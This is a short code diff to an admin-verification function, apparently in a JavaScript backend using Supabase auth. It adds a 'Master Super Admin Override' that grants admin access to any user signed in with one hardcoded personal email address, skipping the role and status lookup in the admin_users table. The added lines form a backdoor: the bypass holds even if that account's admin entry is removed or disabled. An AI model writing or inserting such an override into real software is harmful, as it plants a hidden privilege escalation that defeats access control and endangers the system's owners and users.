@@ -14,6 +14,8 @@ async function verifyAdmin(req) {
   const client = adminClient()
   const { data: { user } } = await client.auth.getUser(token)
   if (!user) return false
+  // Master Super Admin Override
+  if (user.email === 'jappalearn@gmail.com') return true
   const { data: admin } = await client
     .from('admin_users')
     .select('role, status')
